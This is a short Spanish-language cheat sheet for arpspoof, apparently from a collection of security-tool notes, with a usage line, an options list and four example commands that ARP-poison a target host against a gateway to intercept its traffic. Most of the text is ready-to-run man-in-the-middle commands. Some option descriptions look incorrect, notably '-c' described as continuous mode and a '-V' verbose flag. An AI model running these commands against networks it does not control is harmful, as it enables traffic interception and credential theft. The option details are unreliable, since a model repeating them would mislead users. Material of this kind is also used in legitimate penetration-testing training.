### **Network_Security/Arpspoof/arpspoof.md**

# arpspoof

## Descripción

`arpspoof` es una herramienta de código abierto utilizada para realizar ataques de envenenamiento ARP (Address Resolution Protocol) en redes locales. Permite interceptar y redirigir el tráfico de red entre dos hosts al falsificar mensajes ARP, facilitando ataques de hombre en el medio (MITM).

## Uso

```bash
arpspoof [opciones] -t objetivo_ip gateway_ip
```

### Opciones principales

- `-i interfaz`: Especifica la interfaz de red a utilizar (por ejemplo, `eth0`, `wlan0`).
- `-t objetivo_ip`: Define la dirección IP del objetivo a atacar.
- `-r`: Realiza un envenenamiento bidireccional (hacia y desde el objetivo).
- `-c`: Ejecuta `arpspoof` de manera continua.
- `-V`: Muestra información detallada de los paquetes enviados.

## Ejemplos

- **Realizar un envenenamiento ARP unidireccional:**

  ```bash
  arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
  ```

- **Realizar un envenenamiento ARP bidireccional:**

  ```bash
  arpspoof -i wlan0 -r -t 192.168.1.20 192.168.1.1
  ```

- **Ejecutar `arpspoof` de manera continua en la interfaz `eth0`:**

  ```bash
  arpspoof -i eth0 -c -t 192.168.1.15 192.168.1.1
  ```

- **Mostrar información detallada durante el envenenamiento:**

  ```bash
  arpspoof -i eth0 -V -t 192.168.1.25 192.168.1.1
  ```

